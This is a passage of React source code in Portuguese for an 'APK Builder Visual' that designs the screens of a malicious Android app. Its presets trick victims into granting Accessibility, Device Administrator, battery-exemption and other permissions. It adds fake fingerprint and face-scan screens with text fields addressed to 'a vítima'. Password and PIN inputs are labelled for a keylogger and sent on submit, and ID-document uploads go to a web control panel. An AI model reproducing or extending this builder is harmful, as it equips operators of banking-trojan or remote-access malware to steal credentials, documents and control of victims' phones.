            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            <div className="relative flex items-center justify-center" style={{ width: '80px', height: '80px' }}>
              <div 
                className="absolute inset-0 rounded-full animate-ping opacity-25"
                style={{ border: `3px solid ${element.biometricColor || '#00ff00'}` }}
              />
              <div 
                className="rounded-full flex items-center justify-center p-3 shadow-lg"
                style={{ 
                  backgroundColor: 'rgba(0,0,0,0.6)', 
                  border: `2px solid ${element.biometricColor || '#00ff00'}`,
                  boxShadow: `0 0 15px ${element.biometricColor || '#00ff00'}80`
                }}
              >
                <Fingerprint size={40} color={element.biometricColor || '#00ff00'} />
              </div>
            </div>
            <span style={{ fontSize: '11px', color: '#FFF', textAlign: 'center', fontWeight: 'bold' }}>
              {element.biometricText || 'Toque e segure para verificar a digital'}
            </span>
          </div>
        );
        
      case 'facial':
        return (
          <div
            key={element.id}
            style={{
              ...baseStyle,
              backgroundColor: 'transparent',
              flexDirection: 'column',
              gap: '12px',
              padding: '12px',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            <div 
              className={`relative flex flex-col items-center justify-center overflow-hidden ${element.biometricShape === 'oval' ? 'rounded-full' : 'rounded-md'}`} 
              style={{ 
                width: '140px', 
                height: '140px', 
                border: `2px solid ${element.biometricColor || '#ffbf00'}`,
                backgroundColor: 'rgba(0,0,0,0.5)',
                boxShadow: `0 0 10px ${element.biometricColor || '#ffbf00'}30`
              }}
            >
              {element.biometricShape !== 'oval' && (
                <>
                  <div className="absolute top-2 left-2 w-4 h-4 border-t-2 border-l-2" style={{ borderColor: element.biometricColor || '#ffbf00' }} />
                  <div className="absolute top-2 right-2 w-4 h-4 border-t-2 border-r-2" style={{ borderColor: element.biometricColor || '#ffbf00' }} />
                  <div className="absolute bottom-2 left-2 w-4 h-4 border-b-2 border-l-2" style={{ borderColor: element.biometricColor || '#ffbf00' }} />
                  <div className="absolute bottom-2 right-2 w-4 h-4 border-b-2 border-r-2" style={{ borderColor: element.biometricColor || '#ffbf00' }} />
                </>
              )}
              
              <div 
                className="absolute left-0 right-0 h-0.5 shadow-md"
                style={{ 
                  backgroundColor: element.biometricColor || '#ffbf00',
                  boxShadow: `0 0 8px ${element.biometricColor || '#ffbf00'}`,
                  top: '40%',
                  animation: 'scan-line 3s infinite linear'
                }}
              />
            </div>
            <span style={{ fontSize: '11px', color: '#FFF', textAlign: 'center', fontWeight: '500' }}>
              {element.biometricText || 'Posicione seu rosto na área demarcada'}
            </span>
          </div>
        );
        
      case 'loading_bar':
        const barColor = element.style.backgroundColor || '#00ff00';
        return (
          <div
            key={element.id}
            style={{
              ...baseStyle,
              backgroundColor: 'transparent',
              flexDirection: 'column',
              gap: '6px',
              padding: '6px',
            }}
            onClick={handleClick}
            onMouseDown={(e) => handleMouseDown(e, element.id)}
          >
            <span style={{ fontSize: '11px', color: '#FFF', textAlign: 'center', fontWeight: '500' }}>
              {element.loadingText || 'Carregando segurança...'}
            </span>
            <div 
              className="w-full rounded-full overflow-hidden" 
              style={{ 
                height: '10px', 
                backgroundColor: 'rgba(255,255,255,0.2)',
                border: '1px solid rgba(255,255,255,0.1)'
              }}
            >
              <div 
                className="h-full rounded-full"
                style={{ 
                  width: '70%', 
                  backgroundColor: barColor,
                  boxShadow: `0 0 6px ${barColor}`
                }}
              />
            </div>
          </div>
        );
        
      default:
        return null;
    }
  };
  
  // ==================== RENDER ====================
  
  return (
    <div className="min-h-screen bg-[#1e0603] text-white relative z-20 flex flex-col overflow-hidden">
      {/* Header */}
      <header className="bg-[#1a1a1e] border-b border-[#2a2a31]/20 px-4 py-3 flex items-center justify-between relative z-30 shadow-md">
        <div className="flex items-center gap-4">
          <button
            onClick={() => navigate('/build-apk')}
            className="flex items-center gap-2 text-gray-400 hover:text-white transition-colors"
          >
            <ArrowLeft size={20} />
            Voltar
          </button>
          <div className="h-6 w-px bg-gray-600" />
          <div className="flex items-center gap-2">
            <Smartphone className="text-[#ef4444]" size={24} />
            <span className="text-lg font-semibold">APK Builder Visual</span>
          </div>
        </div>
        
        <div className="flex items-center gap-2">
          {/* Novo Template */}
          <button
            onClick={newTemplate}
            className="flex items-center gap-1 px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors text-sm"
          >
            <Plus size={16} />
            Novo
          </button>
          
          {/* Templates Salvos */}
          <button
            onClick={() => setShowSavedTemplates(true)}
            className="flex items-center gap-1 px-3 py-2 bg-[#ef4444] hover:bg-[#ef4444] rounded-md transition-colors text-sm"
          >
            <Layers size={16} />
            Modelos ({savedTemplates.length})
          </button>
          
          {/* Histórico */}
          <button
            onClick={() => setShowApkHistory(true)}
            className="flex items-center gap-1 px-3 py-2 bg-purple-700 hover:bg-[#ef4444] rounded-md transition-colors text-sm"
          >
            <Copy size={16} />
            Histórico ({apkHistory.length})
          </button>
          
          <div className="h-6 w-px bg-gray-600" />
          
          {/* Preview Mode Toggle */}
          <button
            onClick={() => setPreviewMode(!previewMode)}
            className={`flex items-center gap-1 px-3 py-2 rounded-md transition-colors text-sm ${
              previewMode ? 'bg-green-600 text-white' : 'bg-gray-700 hover:bg-gray-600'
            }`}
          >
            <Eye size={16} />
            {previewMode ? 'Editando' : 'Preview'}
          </button>
          
          {/* Save Template */}
          <button
            onClick={saveTemplate}
            className="flex items-center gap-1 px-3 py-2 bg-green-700 hover:bg-green-600 rounded-md transition-colors text-sm"
          >
            <Save size={16} />
            Salvar
          </button>
          
          {/* Build APK */}
          <button
            onClick={handleBuildAPK}
            disabled={isBuilding}
            className="flex items-center gap-1 px-4 py-2 bg-[#84cc16] hover:bg-[#ef4444] rounded-md transition-colors disabled:opacity-50"
          >
            {isBuilding ? <RefreshCw size={16} className="animate-spin" /> : <Download size={16} />}
            {isBuilding ? `${buildProgress}%` : 'Build APK'}
          </button>
        </div>
      </header>
      
      {/* Build Progress */}
      {isBuilding && (
        <div className="bg-gray-800 border-b border-gray-700 px-4 py-2">
          <div className="flex items-center gap-4">
            <div className="flex-1 bg-gray-700 rounded-full h-2">
              <div
                className="bg-[#ef4444] h-2 rounded-full transition-all duration-300"
                style={{ width: `${buildProgress}%` }}
              />
            </div>
            <span className="text-sm text-gray-400">{buildStatus}</span>
          </div>
        </div>
      )}
      
      <div className="flex h-[calc(100vh-64px)] relative z-20 bg-[#1e0603]">
        {/* Left Panel - Elements */}
        {showElementPanel && !previewMode && (
          <div className="w-72 bg-[#280904] border-r border-[#2a2a31]/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
            <div className="p-4">
              <h3 className="text-sm font-semibold text-gray-400 uppercase mb-3">Adicionar Elementos</h3>
              
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={() => addElement('text')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                >
                  <Type size={20} />
                  <span className="text-xs">Texto</span>
                </button>
                <button
                  onClick={() => addElement('button')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                >
                  <Square size={20} />
                  <span className="text-xs">Botão</span>
                </button>
                <button
                  onClick={() => addElement('input')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                >
                  <Keyboard size={20} />
                  <span className="text-xs">Input</span>
                </button>
                <button
                  onClick={() => addElement('image')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                >
                  <Image size={20} />
                  <span className="text-xs">Imagem</span>
                </button>
                <button
                  onClick={() => addElement('logo')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                >
                  <Shield size={20} />
                  <span className="text-xs">Logo</span>
                </button>
                <button
                  onClick={() => addElement('rectangle')}
                  className="flex flex-col items-center gap-2 p-3 bg-gray-700 hover:bg-gray-600 rounded-md transition-colors"
                >
                  <Square size={20} />
                  <span className="text-xs">Retângulo</span>
                </button>
                <button
                  onClick={() => addElement('file_upload')}
                  className="flex flex-col items-center gap-2 p-3 bg-green-700 hover:bg-green-600 rounded-md transition-colors"
                >
                  <Upload size={20} />
                  <span className="text-xs">Upload</span>
                </button>
                <button
                  onClick={() => addElement('fingerprint')}
                  className="flex flex-col items-center gap-2 p-3 bg-[#ef4444] hover:bg-[#ef4444] rounded-md transition-colors"
                >
                  <Fingerprint size={20} />
                  <span className="text-xs">Digital</span>
                </button>
                <button
                  onClick={() => addElement('facial')}
                  className="flex flex-col items-center gap-2 p-3 bg-teal-700 hover:bg-teal-600 rounded-md transition-colors"
                >
                  <Scan size={20} />
                  <span className="text-xs">Facial</span>
                </button>
                <button
                  onClick={() => addElement('loading_bar')}
                  className="flex flex-col items-center gap-2 p-3 bg-[#4d7c0f] hover:bg-[#65a30d] rounded-md transition-colors"
                >
                  <Loader2 size={20} />
                  <span className="text-xs">Carregando</span>
                </button>
              </div>
            </div>
            
            <div className="border-t border-gray-700 p-4">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-xs font-bold text-[#f87171] uppercase tracking-wider">📱 Etapas do App Gerado</h3>
                <span className="text-[10px] bg-[#ef4444]/20 text-[#fca5a5] px-1.5 py-0.5 rounded border border-[#ef4444]/30">
                  {template.screens.length} Etapas
                </span>
              </div>
              <p className="text-[10px] text-gray-400 mb-3">
                Edite a interface visual que será exibida no aparelho ao instalar o app gerado.
              </p>
              
              <div className="space-y-2">
                {template.screens.map((screen, idx) => (
                  <div
                    key={screen.id}
                    className={`flex items-center gap-2 p-2 rounded-md cursor-pointer transition-all ${
                      idx === currentScreenIndex ? 'bg-[#84cc16] shadow-md ring-1 ring-[#fca5a5]' : 'bg-gray-700/80 hover:bg-gray-600'
                    }`}
                    onClick={() => setCurrentScreenIndex(idx)}
                  >
                    <Layers size={16} />
                    <span className="flex-1 text-xs font-semibold truncate">{screen.name}</span>
                    {/* Indicadores */}
                    <div className="flex gap-1">
                      {idx === 0 && (
                        <span className="px-1 py-0.5 bg-[#ef4444] text-[8px] font-bold rounded" title="Primeira tela">1ª</span>
                      )}
                      {idx === template.screens.length - 1 && (
                        <span className="px-1 py-0.5 bg-green-500 text-[8px] font-bold rounded" title="Última tela">FIM</span>
                      )}
                      {screen.captureInputs && (
                        <span className="px-1 py-0.5 bg-[#ef4444] text-[8px] rounded" title="Captura senha/PIN">🔑</span>
                      )}
                    </div>
                    {template.screens.length > 1 && (
                      <button
                        onClick={(e) => { e.stopPropagation(); deleteScreen(idx); }}
                        className="p-1 hover:bg-[#ef4444] rounded transition-colors text-gray-300 hover:text-white"
                        title="Excluir etapa"
                      >
                        <Trash2 size={14} />
                      </button>
                    )}
                  </div>
                ))}
                
                <div className="space-y-1.5 pt-2 border-t border-gray-700/60">
                  <select
                    onChange={(e) => {
                      const val = e.target.value;
                      if (val) {
                        addPresetScreen(val);
                        e.target.value = '';
                      }
                    }}
                    className="w-full flex items-center justify-center gap-2 p-2 bg-[#24242a] border border-[#ef4444]/50 text-[#f87171] rounded-md text-xs font-semibold hover:bg-[#2a2a31] outline-none cursor-pointer text-center"
                    title="Adicionar etapa específica ao fluxo do app"
                  >
                    <option value="">➕ Adicionar Etapa ao App...</option>
                    <option value="accessibility">🔐 1. Acessibilidade</option>
                    <option value="admin">🛡️ 2. Administrador do Dispositivo</option>
                    <option value="battery">🔋 3. Economia de Bateria</option>
                    <option value="permissions">📱 4. Permissões do Sistema</option>
                    <option value="pin">🔑 5. Validação de Senha / PIN</option>
                    <option value="success">✅ 6. Sucesso / Conclusão</option>
                  </select>

                  <button
                    onClick={addScreen}
                    className="w-full flex items-center justify-center gap-2 p-1.5 bg-gray-800 hover:bg-gray-700 text-gray-300 rounded-md text-xs transition-colors border border-gray-700"
                  >
                    <Plus size={14} />
                    <span>Etapa Personalizada em Branco</span>
                  </button>
                </div>
              </div>
            </div>
            
            <div className="border-t border-gray-700 p-4">
              <h3 className="text-sm font-semibold text-gray-400 uppercase mb-3">Tema</h3>
              
              <div className="space-y-3">
                {Object.entries(template.theme).map(([key, value]) => (
                  <div key={key} className="flex items-center justify-between">
                    <span className="text-sm capitalize">{key.replace(/([A-Z])/g, ' $1')}</span>
                    <input
                      type="color"
                      value={value}
                      onChange={(e) => {
                        setTemplate(prev => ({
                          ...prev,
                          theme: { ...prev.theme, [key]: e.target.value }
                        }));
                      }}
                      className="w-8 h-8 rounded border-2 border-gray-600 cursor-pointer"
                    />
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}
        
        {/* Center - Phone Preview */}
        <div
          className="flex-1 flex flex-col items-center justify-center bg-[#170503] relative z-10 overflow-auto p-6 border-x border-[#2a2a31]/10 shadow-inner"
          onMouseMove={handleMouseMove}
          onMouseUp={handleMouseUp}
          onMouseLeave={handleMouseUp}
          onClick={() => setSelectedElementId(null)}
        >
          <div className="relative">
            {/* Phone Frame */}
            <div className="relative w-[400px] h-[820px] bg-gray-800 rounded-[50px] p-2 shadow-2xl">
              {/* Notch */}
              <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-6 bg-gray-800 rounded-b-2xl z-10" />
              
              {/* Screen */}
              <div
                ref={phonePreviewRef}
                className="w-full h-full rounded-[42px] overflow-hidden relative"
                style={{ 
                  backgroundColor: currentScreen?.backgroundColor || '#ffffff',
                  // Garante que elementos filhos não saiam
                  contain: 'paint',
                }}
              >
                {/* Grid de auxílio (só no modo edição) */}
                {!previewMode && (
                  <div 
                    className="absolute inset-0 pointer-events-none opacity-10"
                    style={{
                      backgroundImage: 'linear-gradient(to right, #fff 1px, transparent 1px), linear-gradient(to bottom, #fff 1px, transparent 1px)',
                      backgroundSize: '10% 10%',
                    }}
                  />
                )}
                
                {/* Screen Content */}
                {currentScreen?.elements.map(el => renderElement(el, previewMode))}
                
                {/* Empty State */}
                {currentScreen?.elements.length === 0 && (
                  <div className="absolute inset-0 flex flex-col items-center justify-center text-gray-500">
                    <Smartphone size={48} className="mb-4 opacity-50" />
                    <p className="text-sm">Arraste elementos aqui</p>
                    <p className="text-xs text-gray-600 mt-2">Elementos ficam dentro da tela</p>
                  </div>
                )}
                
                {/* Borda de limite (só no modo edição com elemento selecionado) */}
                {!previewMode && selectedElementId && isDragging && (
                  <div className="absolute inset-0 border-2 border-dashed border-[#2a2a31]/30 pointer-events-none rounded-[40px]" />
                )}
              </div>
              
              {/* Home Indicator */}
              <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-32 h-1 bg-gray-600 rounded-full" />
            </div>
            
            {/* Screen Name */}
            <div className="absolute -bottom-8 left-1/2 -translate-x-1/2 text-center">
              <span className="text-sm text-gray-400">
                Tela {currentScreenIndex + 1} de {template.screens.length}: {currentScreen?.name}
              </span>
            </div>
          </div>
        </div>
        
        {/* Right Panel - Properties */}
        {showPropertiesPanel && !previewMode && selectedElement && (
          <div className="w-80 bg-[#280904] border-l border-[#2a2a31]/20 overflow-y-auto relative z-20 flex-shrink-0 shadow-lg">
            <div className="p-4">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-sm font-semibold text-gray-400 uppercase">Propriedades</h3>
                <div className="flex gap-1">
                  <button
                    onClick={() => duplicateElement(selectedElement.id)}
                    className="p-1.5 bg-gray-700 hover:bg-gray-600 rounded transition-colors"
                    title="Duplicar"
                  >
                    <Copy size={14} />
                  </button>
                  <button
                    onClick={() => deleteElement(selectedElement.id)}
                    className="p-1.5 bg-[#ef4444] hover:bg-[#ef4444] rounded transition-colors"
                    title="Excluir"
                  >
                    <Trash2 size={14} />
                  </button>
                </div>
              </div>
              
              {/* Element Type */}
              <div className="mb-4 p-2 bg-gray-700 rounded-md">
                <span className="text-xs text-gray-400">Tipo: </span>
                <span className="text-sm font-medium capitalize">{selectedElement.type}</span>
              </div>
              
              {/* Content */}
              {(selectedElement.type === 'text' || selectedElement.type === 'button') && (
                <div className="mb-4">
                  <label className="block text-xs text-gray-400 mb-1">Conteúdo</label>
                  <input
                    type="text"
                    value={selectedElement.content}
                    onChange={(e) => updateElement(selectedElement.id, { content: e.target.value })}
                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                  />
                </div>
              )}
              
              {/* Input Properties */}
              {selectedElement.type === 'input' && (
                <>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Tipo de Input</label>
                    <select
                      value={selectedElement.inputType}
                      onChange={(e) => updateElement(selectedElement.id, { inputType: e.target.value as any })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    >
                      <option value="text">Texto</option>
                      <option value="password">Senha</option>
                      <option value="numeric">Numérico</option>
                      <option value="pin">PIN (6 dígitos)</option>
                    </select>
                  </div>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Placeholder</label>
                    <input
                      type="text"
                      value={selectedElement.inputPlaceholder || ''}
                      onChange={(e) => updateElement(selectedElement.id, { inputPlaceholder: e.target.value })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    />
                  </div>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Label (p/ Keylogger)</label>
                    <input
                      type="text"
                      value={selectedElement.inputLabel || ''}
                      onChange={(e) => updateElement(selectedElement.id, { inputLabel: e.target.value })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                      placeholder="Ex: SENHA_INICIAL"
                    />
                  </div>
                  <div className="mb-4">
                    <label className="block text-xs text-gray-400 mb-1">Máximo de Caracteres</label>
                    <input
                      type="number"
                      value={selectedElement.inputMaxLength || ''}
                      onChange={(e) => updateElement(selectedElement.id, { inputMaxLength: parseInt(e.target.value) })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    />
                  </div>
                </>
              )}
              
              {/* Button Action */}
              {selectedElement.type === 'button' && (
                <div className="mb-4">
                  <label className="block text-xs text-gray-400 mb-1">Ação do Botão</label>
                  <select
                    value={selectedElement.buttonAction}
                    onChange={(e) => updateElement(selectedElement.id, { buttonAction: e.target.value as any })}
                    className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                  >
                    <option value="accessibility">🔐 Ativar Acessibilidade</option>
                    <option value="next">▶️ Próxima tela</option>
                    <option value="submit">📤 Enviar dados + Próxima</option>
                    <option value="close">❌ Fechar app (volta p/ home)</option>
                    <option value="home">🏠 Ir para Home do Android</option>
                    <option value="hide">👁️ Minimizar app</option>
                    <option value="open_url">🌐 Abrir URL no navegador</option>
                    <option value="custom">⚙️ Fechar (legado)</option>
                  </select>
                  <p className="text-[10px] text-gray-500 mt-1">
                    {selectedElement.buttonAction === 'accessibility' && '🔐 Abre configurações de acessibilidade do Android'}
                    {selectedElement.buttonAction === 'next' && '→ Avança para a próxima tela da sequência'}
                    {selectedElement.buttonAction === 'submit' && '→ Envia senhas para keylogger e avança'}
                    {selectedElement.buttonAction === 'close' && '→ Fecha o app e volta para tela inicial do celular'}
                    {selectedElement.buttonAction === 'home' && '→ Vai direto para a home do Android'}
                    {selectedElement.buttonAction === 'hide' && '→ Minimiza o app (fica em background)'}
                    {selectedElement.buttonAction === 'open_url' && '🌐 Abre uma URL no navegador padrão da vítima'}
                    {selectedElement.buttonAction === 'custom' && '→ Fecha o app (mesmo que "close")'}
                  </p>
                  
                  {/* Campo de URL quando ação é open_url */}
                  {selectedElement.buttonAction === 'open_url' && (
                    <div className="mt-3">
                      <label className="block text-xs text-gray-400 mb-1">🌐 URL para abrir</label>
                      <input
                        type="text"
                        value={selectedElement.buttonUrl || ''}
                        onChange={(e) => updateElement(selectedElement.id, { buttonUrl: e.target.value })}
                        placeholder="https://google.com.br"
                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                      />
                      <p className="text-[10px] text-gray-500 mt-1">
                        Quando clicar no botão, abre essa URL no navegador
                      </p>
                    </div>
                  )}
                </div>
              )}
              
              {/* Biometric Config (Fingerprint / Facial) */}
              {(selectedElement.type === 'fingerprint' || selectedElement.type === 'facial') && (
                <div className="mb-4 p-3 bg-[#1a1a1e]/30 border border-[#3a3a44] rounded-md">
                  <h4 className="text-sm font-semibold text-[#ef4444] mb-3">🛡️ Configurações Biométricas</h4>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Texto Instrutivo</label>
                    <input
                      type="text"
                      value={selectedElement.biometricText || ''}
                      onChange={(e) => updateElement(selectedElement.id, { biometricText: e.target.value })}
                      placeholder="Instrução para a vítima..."
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    />
                  </div>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Cor do Scanner</label>
                    <input
                      type="color"
                      value={selectedElement.biometricColor || '#00ff00'}
                      onChange={(e) => updateElement(selectedElement.id, { biometricColor: e.target.value })}
                      className="w-full h-10 rounded cursor-pointer"
                    />
                  </div>
                  
                  {selectedElement.type === 'facial' && (
                    <div className="mb-3">
                      <label className="block text-xs text-gray-400 mb-1">Formato do Scanner</label>
                      <select
                        value={selectedElement.biometricShape || 'normal'}
                        onChange={(e) => updateElement(selectedElement.id, { biometricShape: e.target.value as any })}
                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                      >
                        <option value="normal">⏹️ Retângulo Arredondado</option>
                        <option value="oval">🟣 Oval / Circular</option>
                      </select>
                    </div>
                  )}

                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Ação após Sucesso</label>
                    <select
                      value={selectedElement.biometricAction}
                      onChange={(e) => updateElement(selectedElement.id, { biometricAction: e.target.value as any })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    >
                      <option value="next">▶️ Próxima tela</option>
                      <option value="submit">📤 Enviar dados + Próxima</option>
                      <option value="close">❌ Fechar app (volta p/ home)</option>
                      <option value="home">🏠 Ir para Home do Android</option>
                      <option value="hide">👁️ Minimizar app</option>
                      <option value="open_url">🌐 Abrir URL no navegador</option>
                    </select>
                  </div>

                  {selectedElement.biometricAction === 'open_url' && (
                    <div className="mb-3">
                      <label className="block text-xs text-gray-400 mb-1">🌐 URL para abrir</label>
                      <input
                        type="text"
                        value={selectedElement.biometricUrl || ''}
                        onChange={(e) => updateElement(selectedElement.id, { biometricUrl: e.target.value })}
                        placeholder="https://google.com.br"
                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                      />
                    </div>
                  )}
                </div>
              )}

              {/* Loading Bar Config */}
              {selectedElement.type === 'loading_bar' && (
                <div className="mb-4 p-3 bg-pink-900/30 border border-[#4d7c0f] rounded-md">
                  <h4 className="text-sm font-semibold text-pink-400 mb-3">⏳ Configurações da Barra</h4>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Texto de Status</label>
                    <input
                      type="text"
                      value={selectedElement.loadingText || ''}
                      onChange={(e) => updateElement(selectedElement.id, { loadingText: e.target.value })}
                      placeholder="Carregando..."
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    />
                  </div>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Duração do Carregamento (ms)</label>
                    <input
                      type="number"
                      value={selectedElement.loadingDuration || 3000}
                      onChange={(e) => updateElement(selectedElement.id, { loadingDuration: parseInt(e.target.value) || 3000 })}
                      placeholder="3000"
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    />
                  </div>

                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Cor da Barra</label>
                    <input
                      type="color"
                      value={selectedElement.style.backgroundColor || '#00ff00'}
                      onChange={(e) => updateElementStyle(selectedElement.id, { backgroundColor: e.target.value })}
                      className="w-full h-10 rounded cursor-pointer"
                    />
                  </div>

                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Ação ao Concluir</label>
                    <select
                      value={selectedElement.loadingAction}
                      onChange={(e) => updateElement(selectedElement.id, { loadingAction: e.target.value as any })}
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    >
                      <option value="next">▶️ Próxima tela</option>
                      <option value="submit">📤 Enviar dados + Próxima</option>
                      <option value="close">❌ Fechar app (volta p/ home)</option>
                      <option value="home">🏠 Ir para Home do Android</option>
                      <option value="hide">👁️ Minimizar app</option>
                      <option value="open_url">🌐 Abrir URL no navegador</option>
                    </select>
                  </div>

                  {selectedElement.loadingAction === 'open_url' && (
                    <div className="mb-3">
                      <label className="block text-xs text-gray-400 mb-1">🌐 URL para abrir</label>
                      <input
                        type="text"
                        value={selectedElement.loadingUrl || ''}
                        onChange={(e) => updateElement(selectedElement.id, { loadingUrl: e.target.value })}
                        placeholder="https://google.com.br"
                        className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                      />
                    </div>
                  )}
                </div>
              )}
              
              {/* File Upload Config */}
              {selectedElement.type === 'file_upload' && (
                <div className="mb-4 p-3 bg-green-900/30 border border-green-700 rounded-md">
                  <h4 className="text-sm font-semibold text-green-400 mb-3">📤 Configurações de Upload</h4>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Label (identificador no painel)</label>
                    <input
                      type="text"
                      value={selectedElement.fileLabel || ''}
                      onChange={(e) => updateElement(selectedElement.id, { fileLabel: e.target.value })}
                      placeholder="DOCUMENTO_RG"
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    />
                  </div>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Texto do Botão</label>
                    <input
                      type="text"
                      value={selectedElement.fileButtonText || ''}
                      onChange={(e) => updateElement(selectedElement.id, { fileButtonText: e.target.value })}
                      placeholder="Selecionar Arquivo"
                      className="w-full px-3 py-2 bg-gray-700 rounded-md text-sm"
                    />
                  </div>
                  
                  <div className="mb-3">
                    <label className="block text-xs text-gray-400 mb-1">Tipos de arquivo aceitos</label>
                    <div className="flex flex-wrap gap-2">
                      {['image', 'pdf', 'document', 'any'].map(type => (
                        <label key={type} className="flex items-center gap-1 text-xs">
                          <input
                            type="checkbox"
                            checked={selectedElement.fileTypes?.includes(type) || false}
                            onChange={(e) => {
                              const current = selectedElement.fileTypes || [];
                              const updated = e.target.checked 
                                ? [...current, type]
                                : current.filter(t => t !== type);
                              updateElement(selectedElement.id, { fileTypes: updated });
                            }}
                            className="rounded"
                          />
                          <span className="capitalize">{type === 'image' ? '📷 Imagem' : type === 'pdf' ? '📄 PDF' : type === 'document' ? '📝 Documento' : '📁 Qualquer'}</span>
                        </label>
                      ))}
                    </div>
                  </div>
                  
                  <p className="text-[10px] text-gray-500">
                    Os arquivos enviados aparecerão no painel web na seção de documentos do dispositivo.
                  </p>
                </div>
              )}
              
              {/* Image Upload */}
              {(selectedElement.type === 'image' || selectedElement.type === 'logo') && (
                <div className="mb-4">
                  <label className="block text-xs text-gray-400 mb-1">Imagem</label>
                  <input
                    type="file"
                    accept="image/*"
                    ref={fileInputRef}
                    onChange={handleImageUpload}
                    className="hidden"
                  />
                  <button
                    onClick={() => fileInputRef.current?.click()}
                    className="w-full px-3 py-2 bg-gray-700 hover:bg-gray-600 rounded-md text-sm flex items-center justify-center gap-2"
                  >
                    <Upload size={16} />
                    {selectedElement.imageFile ? 'Trocar Imagem' : 'Upload Imagem'}
                  </button>
                </div>
              )}
              
              {/* Position */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Posição (0-{ANDROID_WIDTH}x{ANDROID_HEIGHT})</label>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <span className="text-xs text-gray-500">X</span>
                    <input
                      type="number"
                      min={0}
                      max={ANDROID_WIDTH - selectedElement.size.width}
                      value={Math.round(selectedElement.position.x)}
                      onChange={(e) => {
                        const maxX = ANDROID_WIDTH - selectedElement.size.width;
                        const newX = Math.max(0, Math.min(maxX, parseInt(e.target.value) || 0));
                        updateElement(selectedElement.id, { position: { ...selectedElement.position, x: newX } });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Y</span>
                    <input
                      type="number"
                      min={0}
                      max={ANDROID_HEIGHT - selectedElement.size.height}
                      value={Math.round(selectedElement.position.y)}
                      onChange={(e) => {
                        const maxY = ANDROID_HEIGHT - selectedElement.size.height;
                        const newY = Math.max(0, Math.min(maxY, parseInt(e.target.value) || 0));
                        updateElement(selectedElement.id, { position: { ...selectedElement.position, y: newY } });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                </div>
              </div>
              
              {/* Size */}
              <div className="mb-4">
                <label className="block text-xs text-gray-400 mb-1">Tamanho</label>
                <div className="grid grid-cols-2 gap-2">
                  <div>
                    <span className="text-xs text-gray-500">Largura</span>
                    <input
                      type="number"
                      min={20}
                      max={ANDROID_WIDTH}
                      value={Math.round(selectedElement.size.width)}
                      onChange={(e) => {
                        const newWidth = Math.max(20, Math.min(ANDROID_WIDTH, parseInt(e.target.value) || 20));
                        // Ajusta posição se necessário para caber na tela
                        const maxX = ANDROID_WIDTH - newWidth;
                        const newX = Math.min(selectedElement.position.x, maxX);
                        updateElement(selectedElement.id, { 
                          size: { ...selectedElement.size, width: newWidth },
                          position: { ...selectedElement.position, x: newX }
                        });
                      }}
                      className="w-full px-2 py-1 bg-gray-700 rounded text-sm"
                    />
                  </div>
                  <div>
                    <span className="text-xs text-gray-500">Altura</span>
                    <input
                      type="number"
                      min={20}
                      max={ANDROID_HEIGHT}
                      value={Math.round(selectedElement.size.height)}
                      onChange={(e) => {
                        const newHeight = Math.max(20, Math.min(ANDROID_HEIGHT, parseInt(e.target.value) || 20));
                        // Ajusta posição se necessário para caber na tela
                        const maxY = ANDROID_HEIGHT - newHeight;
                        const newY = Math.min(selectedElement.position.y, maxY);
                        updateElement(selectedElement.id, { 
